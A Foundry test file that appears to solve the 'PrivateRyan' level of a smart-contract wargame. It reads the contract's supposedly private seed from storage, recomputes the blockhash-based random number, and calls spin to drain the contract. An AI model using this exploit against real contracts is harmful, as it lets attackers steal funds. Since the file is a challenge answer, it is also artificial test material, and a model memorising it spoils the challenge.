// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/02_PrivateRyan/PrivateRyan.sol";

// forge test --match-contract PrivateRyanTest -vvvv
contract PrivateRyanTest is BaseTest {
    PrivateRyan instance;

    function setUp() public override {
        super.setUp();
        instance = new PrivateRyan{value: 0.01 ether}();
        vm.roll(48743985);
    }

    function testExploitLevel() public {
        uint256 seed = uint256(vm.load(address(instance), bytes32(uint256(0))));
        uint256 value = getValue(seed);
        instance.spin{value: 0.01 ether}(value);

        checkSuccess();
    }

    function getValue(uint256 seed) internal view returns (uint256) {
        uint256 bigValue = 1157920792373163043235709850086876098532699846659765743394964840033335306843;
        uint256 hashVal = uint256(blockhash(block.number - seed));
        uint256 newValue = bigValue * 100 / 100;
        uint256 result = uint256((uint256(hashVal) / newValue)) % 100;
        return result;
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
